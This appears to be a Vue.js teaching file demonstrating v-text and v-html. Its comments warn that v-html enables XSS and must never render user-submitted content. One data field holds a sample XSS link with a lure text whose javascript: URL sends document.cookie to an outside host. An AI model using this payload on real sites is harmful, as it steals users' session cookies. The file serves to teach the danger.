<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>玉树临风美少年，揽镜自顾夜不眠</title>
    <script src="../js/vue.js"></script>
  </head>

  <body>
    <!-- 
      我们学过的指令：
        v-bind  : 单向绑定解析表达式，可简写为  :xxx
        v-model : 双向绑定数据
        v-for   : 遍历数组、对象、字符串
        v-on    : 绑定事件监听，可简写为@
        v-if    : 条件渲染（动态控制节点是否存在）
        v-else  : 条件渲染（动态控制节点是否存在）
        v-show  : 条件渲染（动态控制节点是否展示）
      v-text:
        1.作用：向其所在的节点中渲染文本内容。
        2.与插值语法的区别：v-text会替换掉节点中的内容，{{xxx}}则不会

      v-html：
        1.作用：向指定节点中渲染包含html结构的内容。
        2.与插值语法的区别：
          (1).v-html会替换掉节点中所有的内容，{{xxx}}则不会。
          (2).v-html可以识别html结构。
        3.严重注意：v-html有安全问题！！！
          (1).在网站上动态渲染任意html是非常危险的，容易导致xss攻击。
          (2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！
     -->
    <div id="app">
      <div>你好，{{name}}</div>
      <div v-html="str"></div>
      <div v-html="str2"></div>
    </div>

    <script>
      Vue.config.productionTip = false;
      const vm = new Vue({
        el: '#app',
        data: {
          name: '小芳芳',
          str: '<h3>你好啊！<h3/>',
          str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你要找的资源了<a/>',
        },
      });
    </script>
  </body>
</html>
